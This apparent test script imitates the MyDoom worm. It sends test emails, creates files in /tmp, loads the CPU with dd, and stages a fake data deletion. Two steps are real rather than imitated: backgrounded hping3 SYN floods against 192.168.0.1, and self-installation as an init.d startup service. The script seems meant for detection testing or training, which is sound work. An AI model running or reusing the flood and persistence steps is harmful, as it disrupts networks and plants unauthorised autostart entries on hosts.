##This script simulates MyDoom behavior by propagating emails, creating files, performing CPU-intensive tasks, mimicking DDoS attacks, setting up persistence, and simulating data deletion.



#!/bin/bash
# Simulate MyDoom-like malware behavior

# Function to mimic email propagation
email_propagation() {
  echo "Simulating email propagation..."
  for i in {1..5}
  do
    echo "This is a MyDoom test email" | mail -s "Test Email $i" user@example.com
  done
  echo "Email propagation simulated."
}

# Function to mimic file creation and replication
create_files() {
  for i in {1..20}
  do
    mkdir -p /tmp/mydoom_directory_$i
    touch /tmp/mydoom_directory_$i/mydoom_file_$i
    echo "This is a test file $i" > /tmp/mydoom_directory_$i/mydoom_file_$i
  done
}

# Function to mimic CPU intensive task
cpu_intensive_task() {
  echo "Starting CPU intensive task..."
  for i in {1..10}
  do
    dd if=/dev/zero of=/dev/null bs=1M count=100 &
  done
  echo "CPU intensive task started."
}

# Function to mimic network activity (DDoS-like behavior)
network_activity() {
  echo "Mimicking network activity..."
  for i in {1..5}
  do
    hping3 -S -p 80 -i u1000 192.168.0.1 &
  done
  echo "Network activity mimicked."
}

# Function to mimic persistence mechanism
persistence_mechanism() {
  echo "Setting up persistence mechanism..."
  cp $0 /etc/init.d/mydoom_persistent
  update-rc.d mydoom_persistent defaults
  echo "Persistence mechanism set."
}

# Function to mimic data deletion (non-destructive for simulation)
data_deletion() {
  echo "Mimicking data deletion..."
  for i in {1..5}
  do
    echo "Simulating deletion of data file $i" > /tmp/deleted_file_$i
  done
  echo "Data deletion simulated."
}

# Main function to execute all behaviors
main() {
  email_propagation
  create_files
  cpu_intensive_task
  network_activity
  persistence_mechanism
  data_deletion
}

main
